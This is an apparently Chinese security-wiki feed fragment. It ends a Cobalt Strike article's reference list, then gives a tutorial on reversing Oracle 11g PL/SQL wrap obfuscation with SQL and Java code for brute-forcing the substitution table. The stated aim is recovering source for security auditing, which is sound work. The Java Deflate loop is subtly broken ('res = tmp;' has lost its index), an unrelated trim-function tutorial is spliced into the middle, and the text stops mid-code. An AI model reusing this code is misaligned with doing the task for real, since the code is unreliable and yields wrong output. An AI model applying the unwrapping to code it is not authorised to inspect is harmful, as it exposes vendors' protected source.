id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://teamssix.com/year/201023-192553.html">https://teamssix.com/year/201023-192553.html</a></li><li><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></li><li><a href="https://payloads.online/tools/socat">https://payloads.online/tools/socat</a></li><li><a href="https://zhuanlan.zhihu.com/p/93718885">https://zhuanlan.zhihu.com/p/93718885</a></li><li><a href="https://www.anquanke.com/post/id/156299">https://www.anquanke.com/post/id/156299</a></li><li><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></li><li><a href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></li><li><a href="https://my.oschina.net/u/4300698/blog/3382230">https://my.oschina.net/u/4300698/blog/3382230</a></li><li><a href="https://segmentfault.com/a/1190000019290085">https://segmentfault.com/a/1190000019290085</a></li><li><a href="https://www.cnblogs.com/cthon/p/9151467.html">https://www.cnblogs.com/cthon/p/9151467.html</a></li><li><a href="https://www.secpulse.com/archives/127186.html">https://www.secpulse.com/archives/127186.html</a></li><li><a href="https://www.freebuf.com/articles/web/231892.html">https://www.freebuf.com/articles/web/231892.html</a></li><li><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></li><li><a href="https://www.renfei.org/blog/introduction-to-spf.html">https://www.renfei.org/blog/introduction-to-spf.html</a></li><li><a href="https://www.cnblogs.com/backlion/p/10616308.html">https://www.cnblogs.com/backlion/p/10616308.html</a></li><li><a href="https://blog.csdn.net/hnjztyx/article/details/52910478">https://blog.csdn.net/hnjztyx/article/details/52910478</a></li><li><a href="http://blog.leanote.com/post/snowming/62ec1132a2c9">http://blog.leanote.com/post/snowming/62ec1132a2c9</a></li><li><a href="https://blog.csdn.net/pipisorry/article/details/52269785">https://blog.csdn.net/pipisorry/article/details/52269785</a></li><li><a href="https://blog.csdn.net/l1028386804/article/details/86675559">https://blog.csdn.net/l1028386804/article/details/86675559</a></li><li><a href="https://www.freebuf.com/company-information/167460.html">https://www.freebuf.com/company-information/167460.html</a></li><li><a href="https://blog.csdn.net/qq_34101364/article/details/108062913">https://blog.csdn.net/qq_34101364/article/details/108062913</a></li><li><a href="https://blog.csdn.net/github_35186068/article/details/80518681">https://blog.csdn.net/github_35186068/article/details/80518681</a></li><li><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/">https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/</a></li><li><a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/</a></li><li><a href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/">https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</a></li><li><a href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/">https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/</a></li><li><a href="https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html">https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html</a></li><li><a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></li><li><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;by Tahir 2021.6.8&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-Cobalt-Strike-模块详解&quot;&gt;&lt;a href=&quot;#1-Cobalt-Strike-模块详解&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="威胁猎捕" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"/>
    
    <category term="Cobalt Strike" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"/>
    
    
    <category term="Cobalt Strike" scheme="http://example.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>Oracle Database 11g Wrap加密解密分析</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/</id>
    <published>2021-07-03T03:17:57.000Z</published>
    <updated>2021-07-03T03:22:48.962Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>​        Oracle为PL/SQL开发者提供的一种对他们所写的代码（oracle下的对象Package、Procedure、Function、Java Source等）进行加密的工具。当PL/SQL代码被加密以后，它就被描述为被“包装过”。使wrap工具对代码进行包装，wrap工具会取出含有要包装的代码的文件名并输出下面的文件：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrap <span class="attribute">iname</span>=plain.sql <span class="attribute">oname</span>=encrypted.plb</span><br></pre></td></tr></table></figure><p>​        因为代码被加密了，所以其细节被隐藏了，而且Oracle不提供解包装设备。但是我们可以编写我们自己的unwrap程序。</p><h2 id="1-Oracle-Wrap的文件格式"><a href="#1-Oracle-Wrap的文件格式" class="headerlink" title="1. Oracle Wrap的文件格式"></a>1. Oracle Wrap的文件格式</h2><p>​        Oracle为了防止自己的对象程序源码泄露，也对其做了wrap处理。因为许多PACKAGE、PROCEDURE等程序本身可能存在SQL注入漏洞，但是如果得不到源码，对其进行审计是很困难的。这样wrap在一定程度上也起到了保护作用。</p><p>​        这里随便找一个Oracle的PACKAGE为实例，这里我们找到kupd$data包程序，其代码如图所示：</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/1.png"></p><p>​        可以将所有被warp加密的*.plb文件内容，分为header和body（BASE64）。header包含有关被加密包的数据库版本，对象类型以及加密和未加密文本的长度信息。</p><p>​        body包含使用BASE64编码的实际被加密的代码。</p><p>​        header格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. CREATE OR REPLACE PACKAGE kupd$data wrapped </span><br><span class="line">2. a000000</span><br><span class="line">3. 1</span><br><span class="line">4. abcd</span><br><span class="line">5. abcd</span><br><span class="line">6. abcd</span><br><span class="line">7. abcd</span><br><span class="line">8. abcd</span><br><span class="line">9. abcd</span><br><span class="line">10. abcd</span><br><span class="line">11. abcd</span><br><span class="line">12. abcd</span><br><span class="line">13. abcd</span><br><span class="line">14. abcd</span><br><span class="line">15. abcd</span><br><span class="line">16. abcd</span><br><span class="line">17. abcd</span><br><span class="line">18. abcd</span><br><span class="line">19. 9</span><br><span class="line">20. abb 42e</span><br></pre></td></tr></table></figure><p>​        展开.plb文件时，可以忽略前20行。包装的代码的header提供有关PL/SQL代码类型的一些信息，下面是header的一些字段（不过，实际上，不需要它们来解密PL/SQL）</p><p>​        第3行：<br>​        看起来像是数据库服务器相关的十六进制值，但是在大多数情况下，它们等于1。因此，使用此标头记录没有实际值。</p><p>​        第19行：<br>​        一个十六进制值，指定PL / SQL对象的类型（所有PL / SQL对象的类型）：</p><table><thead><tr><th align="left">十六进制</th><th align="left">对象类型</th></tr></thead><tbody><tr><td align="left">7</td><td align="left">过程</td></tr><tr><td align="left">8</td><td align="left">函数</td></tr><tr><td align="left">9</td><td align="left">包</td></tr><tr><td align="left">b</td><td align="left">包体</td></tr><tr><td align="left">d</td><td align="left">类型</td></tr><tr><td align="left">e</td><td align="left">类型体</td></tr></tbody></table><p>​        第20行：</p><p>​        header的最后一行包含两个十六进制值，中间用空格分隔。这些值包含长度信息。第一个值包含未加密文本的长度<strong>（不包含CREATE OR REPLACE部分）</strong>。第二个值包含不带标题且不带结尾LF（0x0A）和“ /”符号的包体的长度。</p><p>​        body</p><p>​        如前所述，加密的PL / SQL文本是BASE64编码的，需要解码后才能真正开始解包（解密）。BASE64解码主体的前20个字节包含包装（加密）主体的SHA1哈希值。主体的其余部分是一个编码的（使用编码表）压缩的字节流，其中包含源文本。</p><h2 id="2-Oracle-Wrap的加密机制"><a href="#2-Oracle-Wrap的加密机制" class="headerlink" title="2. Oracle Wrap的加密机制"></a>2. Oracle Wrap的加密机制</h2><p>​        Oracle加密的原理就是先对源码进行lz压缩，得到lz压缩串，然后对压缩串进行SHA-1运算得到40位的加密串，然后将加密串与压缩串拼接得到拼接字符串，然后对拼接字符串进行Oracle双字符转换（转换表）。最后将转换后的字符串进行base64编码，最终得到wrap的加密串。</p><h2 id="3-Unwrap反向解密"><a href="#3-Unwrap反向解密" class="headerlink" title="3. Unwrap反向解密"></a>3. Unwrap反向解密</h2><p>​        通过上面的加密机制，反向操作达到解密目的。</p><h3 id="3-1-base64解码得到Oracle双字符转换后字符串"><a href="#3-1-base64解码得到Oracle双字符转换后字符串" class="headerlink" title="3.1 base64解码得到Oracle双字符转换后字符串"></a>3.1 base64解码得到Oracle双字符转换后字符串</h3><p>​        首先，我们以一小段PL/SQL代码来测试分先加密字符串的结构，这里我先讲程序加密处理。如图所示，这里将create procedure a代码wrap之后变成了如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_ddl_wrap(&#x27;create procedure a&#x27;) from dual;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/2.png"></p><p>​        为了进一步分析其加密字符串中的结构，我们利用如下print_warpped_str.sql代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with src as</span><br><span class="line">( select &#x27;procedure a&#x27; txt from dual ), wrap as</span><br><span class="line">( select src.txt, dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src )</span><br><span class="line">select rtrim( substr( wrap.wrap, instr(wrap.wrap, chr(10), 1, 20 ) + 1),chr(10)) from wrap;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8BgMHdmA3Qg9IbJmntlZoZQoHwcwg5nnm7+fMr2ywFxakaamb40d1Q==</span><br></pre></td></tr></table></figure><p>​        ps:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">oracle中trim，ltrim，rtrim函数用法</span><br><span class="line"></span><br><span class="line">oracle中trim，ltrim，rtrim函数用法</span><br><span class="line">该函数共有两种作用：</span><br><span class="line">第一种，即去除空格。</span><br><span class="line">例子：</span><br><span class="line">--TRIM去除指定字符的前后空格</span><br><span class="line">SQL&gt; SELECT TRIM(&#x27; dd df &#x27;) FROM dual;</span><br><span class="line">TRIM(&#x27;DDDF&#x27;)</span><br><span class="line">\------------</span><br><span class="line">dd df</span><br><span class="line"></span><br><span class="line">--LTRIM去除指定字符的前面空格</span><br><span class="line">SQL&gt; SELECT LTRIM(&#x27; dd df &#x27;) FROM dual;</span><br><span class="line">LTRIM(&#x27;DDDF&#x27;)</span><br><span class="line">\-------------</span><br><span class="line">dd df</span><br><span class="line"></span><br><span class="line">--RTRIM去除指定字符后面后空格</span><br><span class="line">SQL&gt; SELECT RTRIM(&#x27; dd df &#x27;) FROM dual;</span><br><span class="line">RTRIM(&#x27;DDDF&#x27;)</span><br><span class="line">\-------------</span><br><span class="line"> dd df</span><br><span class="line"></span><br><span class="line">第二种，去除指定的字符。trim只能去除单个字符，而ltrim和rtrim可以去除多个字符。</span><br><span class="line">trim去除字符的写法：</span><br><span class="line">--表示字符串string2去除前面|后面|前后面（leading|trailing|both）的字符string1，默认去除方式为both</span><br><span class="line">SELECT TRIM(leading|trailing|both string1 FROM string2) FROM dual;</span><br><span class="line">例子：</span><br><span class="line">SQL&gt; SELECT trim(leading &#x27;d&#x27; from &#x27;dfssa&#x27;) FROM dual;</span><br><span class="line">TRIM(LEADING&#x27;D&#x27;FROM&#x27;DFSSA&#x27;)</span><br><span class="line">\---------------------------</span><br><span class="line">fssa</span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT trim(both &#x27;1&#x27; from &#x27;123sfd111&#x27;) FROM dual;</span><br><span class="line">TRIM(BOTH&#x27;1&#x27;FROM&#x27;123SFD111&#x27;)</span><br><span class="line">\----------------------------</span><br><span class="line">23sfd</span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT trim(trailing &#x27;2&#x27; from &#x27;213dsq12&#x27;) FROM dual;</span><br><span class="line">TRIM(TRAILING&#x27;2&#x27;FROM&#x27;213DSQ12&#x27;)</span><br><span class="line">\------------------------------</span><br><span class="line">213dsq1</span><br></pre></td></tr></table></figure><p>​        进一步对这段代码做base64解码，获得经过Oracle双字符转换后的字符串，如图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with src as</span><br><span class="line">( select &#x27;procedure a&#x27; txt from dual ), wrap as</span><br><span class="line">( select src.txt, dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src )</span><br><span class="line">select utl_encode.base64_decode( utl_raw.cast_to_raw( rtrim( substr( wrap.wrap, instr(wrap.wrap, chr(10), 1, 20 ) + 1),chr(10)))) from wrap;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/4.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F0180C1DD980DD083D21B2669ED959A194281F07308399E79BBF9F32BDB2C05C5A91A6A66F8D1DD5</span><br></pre></td></tr></table></figure><p>因为字符串是由两部分组成，先经过LZ压缩，然后经过SHA-1处理，然后再将SHA-1字符串和压缩字符串拼接得到，因为SHA-1总共40位，所以40位以后的全为经过Oracle双字符转换的压缩串，也就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">308399E79BBF9F32BDB2C05C5A91A6A66F8D1DD5</span><br></pre></td></tr></table></figure><h3 id="3-2-计算Oracle双字符转换表"><a href="#3-2-计算Oracle双字符转换表" class="headerlink" title="3.2 计算Oracle双字符转换表"></a>3.2 计算Oracle双字符转换表</h3><p>​        当wrap完成sha-1字符串和压缩字符串的拼接之后，会对照一个字符代替表进行Oracle双字符转换。这个表可能是Oracle的商业机密，所以官方没有给出该表的信息。</p><p>​        但是，我们已经得到了经过字符转换之后的LZ压缩串，同时我们可以通过LZ算法得到的LZ压缩串，通过对比这两个字符串，我们便可以推算出这个转换表。</p><h4 id="3-2-1-创建LZ压缩包"><a href="#3-2-1-创建LZ压缩包" class="headerlink" title="3.2.1 创建LZ压缩包"></a>3.2.1 创建LZ压缩包</h4><p>​        关于LZ压缩，这里用老外提供的一个JAVA包，为了爆破转换表，我们先把JAVA包创建好，用以进行LZ压缩与解压，LZ_java.sql，如下所示（用SYS用户）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">create or replace java source named UNWRAPPER</span><br><span class="line">as</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.util.zip.*;</span><br><span class="line"></span><br><span class="line">public class UNWRAPPER</span><br><span class="line">&#123;</span><br><span class="line">  public static String Inflate( byte[] src )</span><br><span class="line">  &#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">      ByteArrayInputStream bis = new ByteArrayInputStream( src );</span><br><span class="line">      InflaterInputStream iis = new InflaterInputStream( bis );</span><br><span class="line">      StringBuffer sb = new StringBuffer();</span><br><span class="line">      for( int c = iis.read(); c != -1; c = iis.read() )</span><br><span class="line">      &#123;</span><br><span class="line">        sb.append( (char) c );</span><br><span class="line">      &#125;</span><br><span class="line">      return sb.toString();</span><br><span class="line">    &#125; catch ( Exception e )</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">  public static byte[] Deflate( String src, int quality )</span><br><span class="line">  &#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">      byte[] tmp = new byte[ src.length() + 100 ];</span><br><span class="line">      Deflater defl = new Deflater( quality );</span><br><span class="line">      defl.setInput( src.getBytes( &quot;UTF-8&quot; ) );</span><br><span class="line">      defl.finish();</span><br><span class="line">      int cnt = defl.deflate( tmp );</span><br><span class="line">      byte[] res = new byte[ cnt ];</span><br><span class="line">      for( int i = 0; i &lt; cnt; i++ )</span><br><span class="line">        res = tmp;</span><br><span class="line">      return res;</span><br><span class="line">    &#125; catch ( Exception e )</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">alter java source UNWRAPPER compile</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>​        这里deflate函数实现LZ压缩，而inflate则实现解压。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/5.png"></p><p>​        然后用包把JAVA声明进来，create_amosunwrapper.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">create or replace package amosunwrapper</span><br><span class="line">is</span><br><span class="line">  function deflate( src in varchar2 )</span><br><span class="line">  return raw;</span><br><span class="line">  function deflate( src in varchar2, quality in number )</span><br><span class="line">  return raw;</span><br><span class="line">  function inflate( src in raw )</span><br><span class="line">  return varchar2;</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">create or replace package body amosunwrapper</span><br><span class="line">is</span><br><span class="line">  function deflate( src in varchar2 )</span><br><span class="line">  return raw</span><br><span class="line">  is</span><br><span class="line">  begin</span><br><span class="line">    return deflate( src, 6 );</span><br><span class="line">  end;</span><br><span class="line"></span><br><span class="line">  function deflate( src in varchar2, quality in number )</span><br><span class="line">  return raw</span><br><span class="line">  as language java</span><br><span class="line">  name &#x27;UNWRAPPER.Deflate( java.lang.String, int ) return byte[]&#x27;;</span><br><span class="line"></span><br><span class="line">  function inflate( src in raw )</span><br><span class="line">  return varchar2</span><br><span class="line">  as language java</span><br><span class="line">  name &#x27;UNWRAPPER.Inflate( byte[] ) return java.lang.String&#x27;;</span><br><span class="line"></span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/6.png"></p><h4 id="3-2-2-比较LZ压缩串和base64解码串"><a href="#3-2-2-比较LZ压缩串和base64解码串" class="headerlink" title="3.2.2 比较LZ压缩串和base64解码串"></a>3.2.2 比较LZ压缩串和base64解码串</h4><p>​        创建好LZ压缩包，来看一下，LZ串和base64解码串的对比，</p><p>​        首先，使用JAVA包，需要设置压缩级别参数，这个等级参数不一样，压缩得到的字符串完全不一样。我们可以从０等级开始一个一个进行测试，经过测试发现，Oracle用的是9等级。</p><p>​        所以，我们用以下代码对比两个字符串：comp_lz_and_base64.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">with src AS </span><br><span class="line">( select &#x27;procedure a&#x27; txt  from dual   ),</span><br><span class="line">wrap as   </span><br><span class="line">( select src.txt , dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap  from src  ),</span><br><span class="line">     subst as  </span><br><span class="line"> (select substr( utl_encode.base64_decode( utl_raw.cast_to_raw(rtrim( substr( wrap.wrap, instr( wrap.wrap, chr( 10 ), 1, 20 ) + 1 ), chr(10) )  ) ), 41 ) x,</span><br><span class="line">amosunwrapper.deflate( wrap.txt || chr(0), 9 ) d from wrap  )</span><br><span class="line">    select substr( x, r * 2 - 1, 2 )  c_base64,</span><br><span class="line">   substr( d, r * 2 - 1, 2 )  c_translatecode from subst  , </span><br><span class="line">   ( select rownum r from dual connect by rownum &lt;= ( select length( x ) / 2 from subst ) );</span><br></pre></td></tr></table></figure><p>​        结果如下：</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/7.png"></p><p>​        通过对结果的排序，没有出现同一个base64编码对应不同的十六进制的情况，因此我们知道了可以用这个SQL为基础，通过用不同的串来产生替换表的内容。</p><h4 id="3-2-3-计算替换表"><a href="#3-2-3-计算替换表" class="headerlink" title="3.2.3 计算替换表"></a>3.2.3 计算替换表</h4><p>​        首先建一个IDLTRANSLATE表来存储替换表的内容，create_idltranslate.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SYS.IDLTRANSLATE</span><br><span class="line">  (</span><br><span class="line">    C_BASE64DECODE  VARCHAR2(2) NOT NULL,</span><br><span class="line">    C_LZDEFLATECODE VARCHAR2(2)     NULL</span><br><span class="line">    )</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/8.png"></p><p>​        然后写一段PL/SQL块来生成替换表的内容，储存到IDLTRANSLATE表，generate_idltranslate.sql：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">declare</span><br><span class="line">nCnt integer;</span><br><span class="line">nLoop integer;</span><br><span class="line">nSLoop integer;</span><br><span class="line">nCharmax integer;</span><br><span class="line">nCharmin integer;</span><br><span class="line">vChar Varchar2(3);</span><br><span class="line">cursor getchar is</span><br><span class="line">with src AS ( select &#x27;procedure &#x27;||vChar txt from dual ),</span><br><span class="line">wrap as ( select src.txt , dbms_ddl.wrap( &#x27;create &#x27; || src.txt ) wrap from src ),</span><br><span class="line">subst as (select substr( utl_encode.base64_decode( utl_raw.cast_to_raw(rtrim( substr( wrap.wrap, instr( wrap.wrap, chr( 10 ), 1, 20 ) + 1 ), chr(10) ) ) ), 41 ) x,amosunwrapper.deflate( wrap.txt || chr(0), 9 ) d from wrap )</span><br><span class="line">select substr( x, r*2 - 1, 2 ) xr ,substr( d, r*2 - 1, 2 ) dr from subst , ( select rownum r from dual connect by rownum &lt;= ( select length( x ) / 2 from subst ) );</span><br><span class="line">begin</span><br><span class="line">nCharmax:=97;</span><br><span class="line">nCharmin:=122;</span><br><span class="line">For nLoop In 97..122 Loop</span><br><span class="line">For nSloop In 0..99 Loop</span><br><span class="line">vChar := chr(nLoop)||to_char(nSloop);</span><br><span class="line">For abc In getchar Loop</span><br><span class="line">Select Count(*) Into nCnt From sys.idltranslate WHERE c_base64decode = abc.xr;</span><br><span class="line">If nCnt &lt; 1 Then</span><br><span class="line">Insert INTO sys.idltranslate VALUES (abc.xr,abc.dr);</span><br><span class="line">Commit;</span><br><span class="line">Else</span><br><span class="line">Select Count(*) Into nCnt From sys.idltranslate WHERE c_base64decode = abc.xr AND c_lzdeflatecode=abc.dr;</span><br><span class="line">If nCnt &lt; 1 Then</span><br><span 